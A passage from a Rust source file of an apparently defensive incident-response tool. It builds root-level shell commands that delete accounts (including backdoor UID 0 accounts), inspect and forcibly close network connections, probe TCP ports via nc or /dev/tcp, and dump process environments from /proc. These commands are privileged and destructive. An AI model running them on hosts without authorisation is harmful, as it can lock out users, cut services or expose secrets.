/// `-f` skips exactly that check; without `-r` it still removes no files.
/// Both paths first confirm root is still UID 0, so this never runs on a host
/// where removing the other UID 0 entry could leave no root at all.
fn user_account_delete_command(username: &str, uid_zero: bool) -> String {
    let userdel = if uid_zero { "userdel -f" } else { "userdel" };
    format!(
        "u={username}; if [ \"$(id -u)\" -eq 0 ]; then run=; elif command -v sudo >/dev/null 2>&1; then run='sudo -n'; else printf 'Root privileges are required\\n' >&2; exit 77; fi; [ \"$(getent passwd root 2>/dev/null | cut -d: -f3)\" = 0 ] || {{ printf 'root is not UID 0 on this host\\n' >&2; exit 79; }}; if command -v userdel >/dev/null 2>&1; then $run {userdel} \"$u\"; elif command -v deluser >/dev/null 2>&1; then $run deluser \"$u\"; else printf 'Neither userdel nor deluser is available\\n' >&2; exit 78; fi"
    )
}

/// The command the confirmed plan runs: the delete form depends on the UID
/// the plan read from the target, not on anything the row said.
fn user_account_dispatch_command(
    snapshot: &UserAccountSnapshot,
    action: UserAccountAction,
) -> String {
    match action {
        UserAccountAction::Delete => {
            user_account_delete_command(&shq(&snapshot.username), snapshot.uid == 0)
        }
        UserAccountAction::Lock | UserAccountAction::Unlock => {
            user_account_command(&snapshot.username, action)
        }
    }
}

/// Whether root is still UID 0. Read after a UID 0 account is deleted: both
/// entries share an identity, and the one thing that must not happen is
/// losing the real one.
fn root_uid_command() -> &'static str {
    "getent passwd root 2>/dev/null | cut -d: -f3"
}

/// Supplementary group names, space-separated, for the journal.
fn user_account_groups_command(username: &str) -> String {
    format!("id -Gn -- {} 2>/dev/null", shq(username))
}

fn parse_user_account_groups(output: &str) -> Option<String> {
    let groups = output.split_whitespace().collect::<Vec<_>>();
    (!groups.is_empty()
        && groups.len() <= 256
        && groups.iter().all(|group| is_valid_username(group)))
    .then(|| groups.join(" "))
}

fn user_account_delete_summary(snapshot: &UserAccountSnapshot, groups: Option<&str>) -> String {
    let (process_rule, service_warning) = if snapshot.uid == 0 {
        (
            "这是除 root 之外的 UID 0 账户，拥有与 root 相同的权限，常见于后门。它与 root 共用身份，userdel 会把 root 自己的进程当成它的进程而拒绝，所以这里用 userdel -f 只跳过这一项检查，不删除任何文件；部分旧版 userdel 在 -f 下会一并删除 /var/mail 下同名的邮件文件。执行前确认 root 仍是 UID 0，执行后再核对一次。",
            "",
        )
    } else if snapshot.uid < 1000 {
        (
            "若该账户还有进程在运行，userdel 会拒绝执行，这次不会有任何改动。",
            " UID 小于 1000，通常是系统或服务账户：依赖它运行的服务可能因此无法启动。",
        )
    } else {
        (
            "若该账户还有进程在运行，userdel 会拒绝执行，这次不会有任何改动。",
            "",
        )
    };
    format!(
        "删除用户账户 {}（UID {}，GID {}，主目录 {}，Shell {}，所属组 {}）。只删除账户记录：主目录和该账户拥有的文件保留在原处，之后显示为无属主文件，便于留证。{process_rule}执行后回读确认账户已不存在。{}此操作不可自动恢复：口令哈希不会被保存，账户信息（不含口令）记入操作日志，需要时可按相同 UID/GID 手动重建。",
        snapshot.username,
        snapshot.uid,
        snapshot.gid,
        snapshot.home,
        if snapshot.shell.is_empty() {
            "（无）"
        } else {
            &snapshot.shell
        },
        groups.unwrap_or("未能读出"),
        service_warning,
    )
}

/// What the operator is told after a deletion, in their terms. The receipt
/// summary ends with how the command was received (`accepted`,
/// `rejected-exit-8`, …), which is the only clue to *why* an account is still
/// there.
fn user_account_delete_detail(
    planned: &UserAccountSnapshot,
    observed: Option<&UserAccountSnapshot>,
    receipt_summary: &str,
) -> String {
    let dispatch = receipt_summary.rsplit(": ").next().unwrap_or_default();
    match observed {
        None => format!(
            "账户 {} 已不存在（已回读核实）。主目录 {} 保留在原处。",
            planned.username, planned.home
        ),
        Some(snapshot) if snapshot == planned => {
            let reason = match dispatch {
                "rejected-exit-Some(8)" => {
                    "userdel 退出码 8：该账户还有进程在运行。先在进程页结束这些进程，或改为锁定账户。"
                }
                "rejected-exit-Some(77)" => "需要 root 权限，或当前账户无法免密使用 sudo。",
                "rejected-exit-Some(78)" => "目标机上既没有 userdel 也没有 deluser。",
                "rejected-exit-Some(79)" => {
                    "目标机上 root 已不是 UID 0，为免失去 root 账户没有执行，请先人工检查 /etc/passwd。"
                }
                other if other.starts_with("indeterminate") => "删除命令没有在时限内给出结果。",
                _ => "删除命令没有成功。",
            };
            format!("账户 {} 仍然存在，没有改动。{reason}", planned.username)
        }
        Some(_) => format!(
            "账户 {} 仍然存在，但它的 UID、主目录或状态已和确认时不同，请刷新后核对。",
            planned.username
        ),
    }
}

fn user_account_snapshot_sha256(snapshot: &UserAccountSnapshot) -> String {
    let mut digest = Sha256::new();
    for value in [
        snapshot.username.as_str(),
        snapshot.home.as_str(),
        snapshot.shell.as_str(),
        snapshot.password_state.label(),
        snapshot.session_username.as_str(),
    ] {
        digest.update((value.len() as u64).to_be_bytes());
        digest.update(value.as_bytes());
    }
    digest.update(snapshot.uid.to_be_bytes());
    digest.update(snapshot.gid.to_be_bytes());
    format!("{:x}", digest.finalize())
}

fn bounded_network_output(output: &str) -> (String, bool) {
    if output.len() <= MAX_NETWORK_INVESTIGATION_CHARS {
        return (output.to_owned(), false);
    }
    let mut end = MAX_NETWORK_INVESTIGATION_CHARS;
    while end > 0 && !output.is_char_boundary(end) {
        end -= 1;
    }
    (output[..end].to_owned(), true)
}

fn network_identity_from_table(
    table: &SystemInfoTable,
    row_id: &str,
) -> CoreResult<NetworkConnectionIdentity> {
    if !matches!(
        table.tab,
        SystemInfoTab::Network | SystemInfoTab::Established | SystemInfoTab::OpenPorts
    ) {
        return Err(CoreError::validation(
            "network operation",
            "the selected row is not from a network inventory",
        ));
    }
    let row = table
        .rows
        .iter()
        .find(|row| row.id == row_id)
        .ok_or_else(|| CoreError::NotFound {
            entity: "system information row",
            id: bounded_text(row_id, 256),
        })?;
    let cell = |index: usize, subject: &'static str| -> CoreResult<&str> {
        row.cells
            .get(index)
            .map(String::as_str)
            .ok_or_else(|| invalid_detail_key(subject))
    };
    let (transport, local_display, remote_display, local, remote, state, process) = match table.tab
    {
        SystemInfoTab::Network => {
            let local_display = cell(1, "local endpoint")?.to_owned();
            let remote_display = cell(2, "remote endpoint")?.to_owned();
            (
                parse_network_transport(cell(0, "network transport")?)?,
                local_display.clone(),
                remote_display.clone(),
                parse_network_endpoint(&local_display, None, true)?,
                parse_network_endpoint(&remote_display, None, false)?,
                bounded_network_field(cell(3, "connection state")?, 64)?,
                bounded_network_field(cell(5, "connection process")?, MAX_CELL_CHARS)?,
            )
        }
        SystemInfoTab::Established => {
            let local_display = cell(0, "local endpoint")?.to_owned();
            let remote_display = cell(1, "remote endpoint")?.to_owned();
            (
                NetworkTransport::Tcp,
                local_display.clone(),
                remote_display.clone(),
                parse_network_endpoint(&local_display, None, false)?,
                parse_network_endpoint(&remote_display, Some(cell(2, "remote port")?), false)?,
                "ESTABLISHED".to_owned(),
                bounded_network_field(cell(4, "connection process")?, MAX_CELL_CHARS)?,
            )
        }
        SystemInfoTab::OpenPorts => {
            let address = cell(1, "local address")?;
            let port = cell(2, "local port")?;
            let local = parse_network_endpoint(address, Some(port), true)?;
            let local_display = local
                .as_ref()
                .map_or_else(|| format!("{address}:{port}"), endpoint_display);
            (
                parse_network_transport(cell(0, "network transport")?)?,
                local_display,
                String::new(),
                local,
                None,
                "LISTEN".to_owned(),
                bounded_network_field(cell(4, "connection process")?, MAX_CELL_CHARS)?,
            )
        }
        _ => unreachable!("validated network tab"),
    };
    Ok(NetworkConnectionIdentity {
        tab: table.tab,
        row_id: row.id.clone(),
        transport,
        local,
        remote,
        local_display,
        remote_display,
        state,
        process,
    })
}

fn parse_network_transport(value: &str) -> CoreResult<NetworkTransport> {
    let value = value.trim().to_ascii_lowercase();
    if value.starts_with("tcp") {
        Ok(NetworkTransport::Tcp)
    } else if value.starts_with("udp") {
        Ok(NetworkTransport::Udp)
    } else {
        Err(invalid_detail_key("TCP/UDP transport"))
    }
}

fn parse_network_endpoint(
    display: &str,
    port_hint: Option<&str>,
    allow_wildcard: bool,
) -> CoreResult<Option<NetworkEndpoint>> {
    let display = display.trim();
    if display.is_empty() {
        return Ok(None);
    }
    let hinted_port = port_hint.map(parse_network_port).transpose()?.flatten();
    let (address_text, parsed_port) = if let Some(stripped) = display.strip_prefix('[') {
        let (address, remainder) = stripped
            .split_once(']')
            .ok_or_else(|| invalid_detail_key("bracketed network endpoint"))?;
        let port = remainder
            .strip_prefix(':')
            .map(parse_network_port)
            .transpose()?
            .flatten();
        (address, port)
    } else if display.parse::<IpAddr>().is_ok() {
        (display, None)
    } else if let Some((address, port)) = display.rsplit_once(':') {
        (address, parse_network_port(port)?)
    } else {
        (display, None)
    };
    let port = hinted_port.or(parsed_port);
    let address = match address_text {
        "*" if allow_wildcard => IpAddr::V4(Ipv4Addr::UNSPECIFIED),
        "*" => return Ok(None),
        value => value
            .parse::<IpAddr>()
            .map_err(|_| invalid_detail_key("IP address"))?,
    };
    Ok(Some(NetworkEndpoint { address, port }))
}

fn parse_network_port(value: &str) -> CoreResult<Option<u16>> {
    let value = value.trim();
    if value.is_empty() || value == "*" {
        return Ok(None);
    }
    let port = value
        .parse::<u16>()
        .ok()
        .filter(|port| *port > 0)
        .ok_or_else(|| invalid_detail_key("network port"))?;
    Ok(Some(port))
}

fn bounded_network_field(value: &str, maximum_chars: usize) -> CoreResult<String> {
    if value.chars().any(char::is_control) {
        return Err(invalid_detail_key("network field"));
    }
    Ok(value.chars().take(maximum_chars).collect())
}

fn endpoint_display(endpoint: &NetworkEndpoint) -> String {
    match (endpoint.address, endpoint.port) {
        (IpAddr::V6(address), Some(port)) => format!("[{address}]:{port}"),
        (address, Some(port)) => format!("{address}:{port}"),
        (address, None) => address.to_string(),
    }
}

fn network_remote(identity: &NetworkConnectionIdentity) -> CoreResult<&NetworkEndpoint> {
    identity
        .remote
        .as_ref()
        .filter(|endpoint| !endpoint.address.is_unspecified())
        .ok_or_else(|| CoreError::validation("network investigation", "remote IP is unavailable"))
}

fn network_analysis_port(identity: &NetworkConnectionIdentity) -> CoreResult<u16> {
    identity
        .remote
        .as_ref()
        .and_then(|endpoint| endpoint.port)
        .or_else(|| identity.local.as_ref().and_then(|endpoint| endpoint.port))
        .ok_or_else(|| CoreError::validation("network investigation", "port is unavailable"))
}

fn validate_network_action(
    identity: &NetworkConnectionIdentity,
    action: NetworkInvestigationAction,
) -> CoreResult<()> {
    match action {
        NetworkInvestigationAction::PortService => {
            network_analysis_port(identity)?;
        }
        NetworkInvestigationAction::PortProcess => {
            identity
                .local
                .as_ref()
                .and_then(|endpoint| endpoint.port)
                .ok_or_else(|| {
                    CoreError::validation("network investigation", "local port is unavailable")
                })?;
        }
        NetworkInvestigationAction::PortConnectivity | NetworkInvestigationAction::TcpProbe => {
            if identity.transport != NetworkTransport::Tcp {
                return Err(CoreError::validation(
                    "network investigation",
                    "TCP connectivity tests require a TCP row",
                ));
            }
            let remote = network_remote(identity)?;
            remote.port.ok_or_else(|| {
                CoreError::validation("network investigation", "remote port is unavailable")
            })?;
        }
        NetworkInvestigationAction::BlacklistCheck => {
            if !matches!(network_remote(identity)?.address, IpAddr::V4(_)) {
                return Err(CoreError::validation(
                    "network investigation",
                    "DNS blacklist checks currently require IPv4",
                ));
            }
        }
        NetworkInvestigationAction::AnomalyDetect => {
            network_remote(identity)?;
            network_analysis_port(identity)?;
        }
        NetworkInvestigationAction::Whois
        | NetworkInvestigationAction::Geolocation
        | NetworkInvestigationAction::ReverseDns
        | NetworkInvestigationAction::IpType
        | NetworkInvestigationAction::Ping
        | NetworkInvestigationAction::Traceroute
        | NetworkInvestigationAction::Latency
        | NetworkInvestigationAction::ThreatIntel
        | NetworkInvestigationAction::ConnectionFrequency
        | NetworkInvestigationAction::FirewallRules
        | NetworkInvestigationAction::ConnectionHistory
        | NetworkInvestigationAction::AccessLogs
        | NetworkInvestigationAction::SecurityLogs => {
            network_remote(identity)?;
        }
    }
    Ok(())
}

fn validate_network_disconnect(identity: &NetworkConnectionIdentity) -> CoreResult<()> {
    if identity.transport != NetworkTransport::Tcp
        || !matches!(
            identity.tab,
            SystemInfoTab::Network | SystemInfoTab::Established
        )
    {
        return Err(CoreError::validation(
            "network disconnect",
            "only an observed TCP connection can be disconnected",
        ));
    }
    let local = identity.local.as_ref().ok_or_else(|| {
        CoreError::validation("network disconnect", "local endpoint is unavailable")
    })?;
    let remote = network_remote(identity)?;
    if local.address.is_unspecified() || local.port.is_none() || remote.port.is_none() {
        return Err(CoreError::validation(
            "network disconnect",
            "both exact IP addresses and ports are required",
        ));
    }
    Ok(())
}

fn network_investigation_command(
    identity: &NetworkConnectionIdentity,
    action: NetworkInvestigationAction,
) -> CoreResult<String> {
    validate_network_action(identity, action)?;
    let remote = identity.remote.as_ref();
    let ip = remote.map(|endpoint| endpoint.address.to_string());
    let ip_value = ip.as_deref().map(shq);
    let port = network_analysis_port(identity).ok();
    let local_port = identity.local.as_ref().and_then(|endpoint| endpoint.port);
    let command = match action {
        NetworkInvestigationAction::Whois => format!(
            "ip={}; if command -v whois >/dev/null 2>&1; then whois -- \"$ip\" 2>/dev/null || printf 'WHOIS query failed\\n'; else printf 'whois command is not installed\\n'; fi",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::Geolocation => format!(
            "ip={}; if command -v geoiplookup >/dev/null 2>&1; then geoiplookup \"$ip\" 2>/dev/null || printf 'Local GeoIP lookup failed\\n'; elif command -v geoiplookup6 >/dev/null 2>&1; then geoiplookup6 \"$ip\" 2>/dev/null || printf 'Local GeoIP lookup failed\\n'; else printf 'No local GeoIP database tool is installed; no online API was contacted\\n'; fi",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::ReverseDns => format!(
            "ip={}; getent hosts \"$ip\" 2>/dev/null || (command -v dig >/dev/null 2>&1 && dig -x \"$ip\" +short 2>/dev/null) || (command -v nslookup >/dev/null 2>&1 && nslookup \"$ip\" 2>/dev/null) || printf 'No reverse DNS result\\n'",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::IpType => {
            let remote = network_remote(identity)?;
            format!(
                "printf 'IP\\t%s\\nType\\t%s\\n' {} {}",
                shq(&remote.address.to_string()),
                shq(ip_address_class(remote.address)),
            )
        }
        NetworkInvestigationAction::PortService => {
            let port = port.expect("validated analysis port");
            format!(
                "port={}; printf 'Port\\t%s\\n\\n/etc/services\\n' \"$port\"; grep -E \"^[^#[:space:]]+[[:space:]]+$port/(tcp|udp)([[:space:]]|$)\" /etc/services 2>/dev/null | head -n 10 || true; printf '\\nCommon classification\\n'; case \"$port\" in 21) echo FTP;; 22) echo SSH;; 25) echo SMTP;; 53) echo DNS;; 80) echo HTTP;; 443) echo HTTPS;; 3306) echo MySQL;; 5432) echo PostgreSQL;; 6379) echo Redis;; 27017) echo MongoDB;; 3389) echo RDP;; *) echo 'No built-in classification';; esac",
                shq(&port.to_string())
            )
        }
        NetworkInvestigationAction::PortProcess => {
            let port = local_port.expect("validated local port");
            format!(
                "port={}; if command -v lsof >/dev/null 2>&1; then lsof -nP -i :\"$port\" 2>/dev/null | head -n 100; else ss -H -tulnp 2>/dev/null | grep -E \"(:|])$port([[:space:]]|$)\" | head -n 100 || true; fi",
                shq(&port.to_string())
            )
        }
        NetworkInvestigationAction::PortConnectivity | NetworkInvestigationAction::TcpProbe => {
            let remote = network_remote(identity)?;
            let port = remote.port.expect("validated remote port");
            format!(
                "ip={}; port={}; if command -v nc >/dev/null 2>&1; then if nc -z -w 5 -- \"$ip\" \"$port\" 2>/dev/null; then printf 'TCP connection succeeded\\n'; else printf 'TCP connection failed or timed out\\n'; fi; elif command -v timeout >/dev/null 2>&1 && command -v bash >/dev/null 2>&1; then if timeout 5 bash -c 'exec 3<>/dev/tcp/$1/$2' _ \"$ip\" \"$port\" 2>/dev/null; then printf 'TCP connection succeeded\\n'; else printf 'TCP connection failed or timed out\\n'; fi; else printf 'No bounded TCP probe tool is available\\n'; fi",
                shq(&remote.address.to_string()),
                shq(&port.to_string()),
            )
        }
        NetworkInvestigationAction::Ping => format!(
            "ip={}; ping -c 4 -W 2 -- \"$ip\" 2>/dev/null || printf 'Ping failed or is not permitted\\n'",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::Traceroute => format!(
            "ip={}; if command -v traceroute >/dev/null 2>&1; then traceroute -m 15 -- \"$ip\" 2>/dev/null || printf 'Traceroute failed\\n'; elif command -v tracepath >/dev/null 2>&1; then tracepath -m 15 \"$ip\" 2>/dev/null || printf 'Tracepath failed\\n'; else printf 'No traceroute tool is installed\\n'; fi",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::Latency => format!(
            "ip={}; ping -c 10 -W 2 -- \"$ip\" 2>/dev/null | tail -n 2 || printf 'Latency test failed\\n'",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::ThreatIntel => {
            let remote = network_remote(identity)?;
            format!(
                "printf 'IP\\t%s\\nPort\\t%s\\nProtocol\\t%s\\nType\\t%s\\nNote\\tExport this inert indicator to an approved threat-intelligence provider; LovelyHawk does not contact an online API automatically.\\n' {} {} {} {}",
                shq(&remote.address.to_string()),
                shq(&remote
                    .port
                    .map_or_else(|| "-".to_owned(), |port| port.to_string())),
                shq(identity.transport.label()),
                shq(ip_address_class(remote.address)),
            )
        }
        NetworkInvestigationAction::BlacklistCheck => {
            let IpAddr::V4(address) = network_remote(identity)?.address else {
                unreachable!("validated IPv4 DNSBL action")
            };
            let octets = address.octets();
            let reverse = format!("{}.{}.{}.{}", octets[3], octets[2], octets[1], octets[0]);
            format!(
                "rev={}; for zone in zen.spamhaus.org dnsbl.sorbs.net; do name=\"$rev.$zone\"; if getent hosts \"$name\" >/dev/null 2>&1; then printf '%s\\tlisted\\n' \"$zone\"; else printf '%s\\tnot listed or query unavailable\\n' \"$zone\"; fi; done",
                shq(&reverse)
            )
        }
        NetworkInvestigationAction::AnomalyDetect => {
            let remote = network_remote(identity)?;
            let port = network_analysis_port(identity)?;
            let port_class = if port < 1024 {
                "privileged"
            } else {
                "unprivileged"
            };
            let common = matches!(
                port,
                21 | 22 | 25 | 53 | 80 | 443 | 3306 | 5432 | 6379 | 27017 | 3389
            );
            format!(
                "printf 'Remote IP\\t%s\\nRemote port\\t%s\\nPort class\\t%s\\nKnown service port\\t%s\\nConnection state\\t%s\\nProcess\\t%s\\n' {} {} {} {} {} {}",
                shq(&remote.address.to_string()),
                shq(&port.to_string()),
                shq(port_class),
                shq(if common { "yes" } else { "no" }),
                shq(&identity.state),
                shq(&identity.process),
            )
        }
        NetworkInvestigationAction::ConnectionFrequency => format!(
            "ip={}; printf 'Current TCP connections\\t%s\\n' \"$(ss -H -tn 2>/dev/null | grep -F -- \"$ip\" | wc -l)\"; printf '\\nMatching connections\\n'; ss -H -tnp 2>/dev/null | grep -F -- \"$ip\" | head -n 100 || true",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::FirewallRules => format!(
            "ip={}; if command -v iptables-save >/dev/null 2>&1; then iptables-save 2>/dev/null | grep -F -- \"$ip\" | head -n 100 || true; elif command -v nft >/dev/null 2>&1; then nft list ruleset 2>/dev/null | grep -F -- \"$ip\" | head -n 100 || true; else printf 'No supported firewall reader is available\\n'; fi",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::ConnectionHistory => format!(
            "ip={}; journalctl -n 500 --no-pager 2>/dev/null | grep -F -- \"$ip\" | tail -n 100 || true",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::AccessLogs => format!(
            "ip={}; for file in /var/log/nginx/access.log /var/log/apache2/access.log /var/log/httpd/access_log; do if [ -r \"$file\" ]; then printf '\\n%s\\n' \"$file\"; grep -F -- \"$ip\" \"$file\" 2>/dev/null | tail -n 50 || true; fi; done",
            ip_value.expect("validated remote IP")
        ),
        NetworkInvestigationAction::SecurityLogs => format!(
            "ip={}; for file in /var/log/auth.log /var/log/secure; do if [ -r \"$file\" ]; then printf '\\n%s\\n' \"$file\"; grep -F -- \"$ip\" \"$file\" 2>/dev/null | tail -n 50 || true; fi; done; printf '\\nJournal\\n'; journalctl -n 500 --no-pager 2>/dev/null | grep -F -- \"$ip\" | tail -n 50 || true",
            ip_value.expect("validated remote IP")
        ),
    };
    Ok(command)
}

fn ip_address_class(address: IpAddr) -> &'static str {
    match address {
        IpAddr::V4(address) if address.is_loopback() => "IPv4 loopback",
        IpAddr::V4(address) if address.is_private() => "IPv4 private",
        IpAddr::V4(address) if address.is_link_local() => "IPv4 link-local",
        IpAddr::V4(address) if address.is_multicast() => "IPv4 multicast",
        IpAddr::V4(address) if address.is_unspecified() => "IPv4 unspecified",
        IpAddr::V4(_) => "IPv4 public or special-purpose",
        IpAddr::V6(address) if address.is_loopback() => "IPv6 loopback",
        IpAddr::V6(address) if address.is_unicast_link_local() => "IPv6 link-local",
        IpAddr::V6(address) if address.is_multicast() => "IPv6 multicast",
        IpAddr::V6(address) if address.is_unspecified() => "IPv6 unspecified",
        IpAddr::V6(_) => "IPv6 global, unique-local, or special-purpose",
    }
}

fn network_snapshot_command(identity: &NetworkConnectionIdentity) -> String {
    let local = shq(&identity.local_display);
    let remote = shq(&identity.remote_display);
    format!(
        "l={local}; r={remote}; if command -v ss >/dev/null 2>&1; then ss -H -tnp state established 2>/dev/null | awk -v l=\"$l\" -v r=\"$r\" '$4==l && $5==r {{p=\"\"; for(i=6;i<=NF;i++) p=p (i==6?\"\":\" \") $i; gsub(/\\t/,\" \",p); print $4\"\\t\"$5\"\\t\"$1\"\\t\"p; found=1; exit}} END {{if(!found) exit 44}}'; else netstat -tnp 2>/dev/null | awk -v l=\"$l\" -v r=\"$r\" '$4==l && $5==r && $6==\"ESTABLISHED\" {{p=\"\"; for(i=7;i<=NF;i++) p=p (i==7?\"\":\" \") $i; gsub(/\\t/,\" \",p); print $4\"\\t\"$5\"\\t\"$6\"\\t\"p; found=1; exit}} END {{if(!found) exit 44}}'; fi"
    )
}

fn parse_network_snapshot(output: &str) -> CoreResult<NetworkConnectionSnapshot> {
    let mut fields = output.trim_end().splitn(4, '\t');
    let local_display = bounded_network_field(
        fields
            .next()
            .filter(|value| !value.is_empty())
            .ok_or_else(|| invalid_detail_key("snapshot local endpoint"))?,
        256,
    )?;
    let remote_display = bounded_network_field(
        fields
            .next()
            .filter(|value| !value.is_empty())
            .ok_or_else(|| invalid_detail_key("snapshot remote endpoint"))?,
        256,
    )?;
    parse_network_endpoint(&local_display, None, false)?
        .ok_or_else(|| invalid_detail_key("snapshot local endpoint"))?;
    parse_network_endpoint(&remote_display, None, false)?
        .ok_or_else(|| invalid_detail_key("snapshot remote endpoint"))?;
    let state = bounded_network_field(
        fields
            .next()
            .filter(|value| !value.is_empty())
            .ok_or_else(|| invalid_detail_key("snapshot connection state"))?,
        64,
    )?;
    let process = bounded_network_field(fields.next().unwrap_or_default(), MAX_CELL_CHARS)?;
    Ok(NetworkConnectionSnapshot {
        local_display,
        remote_display,
        state,
        process_sha256: format!("{:x}", Sha256::digest(process.as_bytes())),
    })
}

fn network_disconnect_command(identity: &NetworkConnectionIdentity) -> CoreResult<String> {
    validate_network_disconnect(identity)?;
    let local = identity.local.as_ref().expect("validated local endpoint");
    let remote = identity.remote.as_ref().expect("validated remote endpoint");
    Ok(format!(
        "lip={}; lport={}; rip={}; rport={}; ss -K src \"$lip\" sport = \"$lport\" dst \"$rip\" dport = \"$rport\"",
        shq(&local.address.to_string()),
        shq(&local.port.expect("validated local port").to_string()),
        shq(&remote.address.to_string()),
        shq(&remote.port.expect("validated remote port").to_string()),
    ))
}

fn network_snapshot_sha256(snapshot: &NetworkConnectionSnapshot) -> String {
    let mut digest = Sha256::new();
    for value in [
        snapshot.local_display.as_str(),
        snapshot.remote_display.as_str(),
        snapshot.state.as_str(),
        snapshot.process_sha256.as_str(),
    ] {
        digest.update((value.len() as u64).to_be_bytes());
        digest.update(value.as_bytes());
    }
    format!("{:x}", digest.finalize())
}

/// The identity a signal is checked against, before and after it is sent.
///
/// A zombie counts as absent. It has already died — no code runs, no file is
/// open, no socket is held — and only its parent's `wait()` keeps the PID on
/// the list. Reading it as "still there" made a kill that had worked report
/// that it had not, whenever the parent was something that never reaps.
fn process_identity_command(pid: u32) -> String {
    let pid = shq(&pid.to_string());
    format!(
        "p={pid}; if [ ! -r \"/proc/$p/stat\" ]; then printf 'ABSENT\\n'; exit 0; fi; stat=$(cat \"/proc/$p/stat\") || exit 44; rest=${{stat##*) }}; case \"${{rest%% *}}\" in Z) printf 'ABSENT\\n'; exit 0;; esac; start=$(printf '%s\\n' \"$rest\" | awk '{{print $20}}'); name=${{stat%)*}}; name=${{name#*(}}; case \"$start\" in ''|*[!0-9]*) exit 45;; esac; printf '%s\\t%s\\t%s\\n' \"$p\" \"$start\" \"$name\""
    )
}

fn parse_process_identity(output: &str) -> CoreResult<ProcessIdentitySnapshot> {
    let mut fields = output.trim_end().splitn(3, '\t');
    let pid = fields
        .next()
        .filter(|value| is_valid_pid(value))
        .ok_or_else(|| invalid_detail_key("process snapshot PID"))?
        .parse()
        .map_err(|_| invalid_detail_key("process snapshot PID"))?;
    let start_time_ticks = fields
        .next()
        .filter(|value| !value.is_empty() && value.bytes().all(|byte| byte.is_ascii_digit()))
        .ok_or_else(|| invalid_detail_key("process start time"))?
        .parse()
        .map_err(|_| invalid_detail_key("process start time"))?;
    let command_name = fields
        .next()
        .filter(|value| !value.is_empty() && !value.chars().any(char::is_control))
        .ok_or_else(|| invalid_detail_key("process command name"))?;
    Ok(ProcessIdentitySnapshot {
        pid,
        start_time_ticks,
        command_name: bounded_text(command_name, 256),
    })
}

fn process_investigation_command(pid: u32, action: ProcessInvestigationAction) -> String {
    let pid = shq(&pid.to_string());
    let probe = match action {
        ProcessInvestigationAction::CommandLine => {
            "tr '\\0' ' ' < \"/proc/$p/cmdline\" 2>/dev/null; printf '\\n'"
        }
        ProcessInvestigationAction::Executable => "readlink \"/proc/$p/exe\" 2>/dev/null",
        ProcessInvestigationAction::WorkingDirectory => "readlink \"/proc/$p/cwd\" 2>/dev/null",
        ProcessInvestigationAction::Status => "cat \"/proc/$p/status\" 2>/dev/null",
        ProcessInvestigationAction::Capabilities => {
            "awk '/^Cap(Inh|Prm|Eff|Bnd|Amb):/' \"/proc/$p/status\" 2>/dev/null"
        }
        ProcessInvestigationAction::UidGid => {
            "awk '/^(Uid|Gid|Groups):/' \"/proc/$p/status\" 2>/dev/null"
        }
        ProcessInvestigationAction::OpenFiles => {
            "find \"/proc/$p/fd\" -mindepth 1 -maxdepth 1 2>/dev/null | sed 's|.*/||' | sort -n | head -n 100 | while read -r fd; do printf '%s\\t' \"$fd\"; readlink \"/proc/$p/fd/$fd\" 2>/dev/null; done"
        }
        ProcessInvestigationAction::MemoryMaps => "head -n 100 \"/proc/$p/maps\" 2>/dev/null",
        ProcessInvestigationAction::ResourceLimits => "cat \"/proc/$p/limits\" 2>/dev/null",
        ProcessInvestigationAction::IoStats => "cat \"/proc/$p/io\" 2>/dev/null",
        ProcessInvestigationAction::MemoryUsage => {
            "awk '/^Vm/{print}' \"/proc/$p/status\" 2>/dev/null"
        }
        ProcessInvestigationAction::Smaps => "head -n 200 \"/proc/$p/smaps\" 2>/dev/null",
        ProcessInvestigationAction::Environment => {
            "tr '\\0' '\\n' < \"/proc/$p/environ\" 2>/dev/null | head -n 200"
        }
        ProcessInvestigationAction::NetworkConnections => {
            "ss -H -tunap 2>/dev/null | grep -F \"pid=$p,\" | head -n 100"
        }
        ProcessInvestigationAction::ListeningPorts => {
            "ss -H -tulnp 2>/dev/null | grep -F \"pid=$p,\" | head -n 100"
        }
        ProcessInvestigationAction::NetworkStatus => {
            "printf 'TCP\\n'; ss -H -tnp 2>/dev/null | grep -F \"pid=$p,\" | head -n 100; printf '\\nUDP\\n'; ss -H -unp 2>/dev/null | grep -F \"pid=$p,\" | head -n 100; printf '\\nSOCKETS\\n'; find \"/proc/$p/fd\" -mindepth 1 -maxdepth 1 -type l -exec readlink {} \\; 2>/dev/null | grep '^socket:' | head -n 100"
        }
        ProcessInvestigationAction::DnsSockets => {
            "ss -H -tunap 2>/dev/null | grep -F \"pid=$p,\" | awk '$5 ~ /:53$/ || $6 ~ /:53$/ {print}' | head -n 100"
        }
        ProcessInvestigationAction::ProcessTree => {
            "if command -v pstree >/dev/null 2>&1; then pstree -aps \"$p\" 2>/dev/null; else ps -o pid=,ppid=,user=,stat=,args= -p \"$p\" --ppid \"$p\" 2>/dev/null; fi"
        }
        ProcessInvestigationAction::Children => {
            "ps -o pid=,ppid=,user=,stat=,args= --ppid \"$p\" 2>/dev/null | head -n 100"
        }
        ProcessInvestigationAction::Parent => {
            "pp=$(ps -o ppid= -p \"$p\" 2>/dev/null | xargs); [ -n \"$pp\" ] && ps -o pid=,ppid=,user=,stat=,args= -p \"$pp\" 2>/dev/null"
        }
        ProcessInvestigationAction::Threads => {
            "printf 'Thread count: %s\\n' \"$(find \"/proc/$p/task\" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | wc -l)\"; ps -T -p \"$p\" -o pid=,spid=,stat=,comm= 2>/dev/null | head -n 100"
        }
        ProcessInvestigationAction::CpuUsage => {
            "ps -p \"$p\" -o pid=,ppid=,pcpu=,pmem=,vsz=,rss=,stat=,lstart=,time=,args= 2>/dev/null; i=0; while [ \"$i\" -lt 5 ]; do ps -p \"$p\" -o pcpu= 2>/dev/null || exit 0; i=$((i+1)); [ \"$i\" -lt 5 ] && sleep 1; done"
        }
        ProcessInvestigationAction::CpuAffinity => "taskset -cp \"$p\" 2>/dev/null",
        ProcessInvestigationAction::ContextSwitches => {
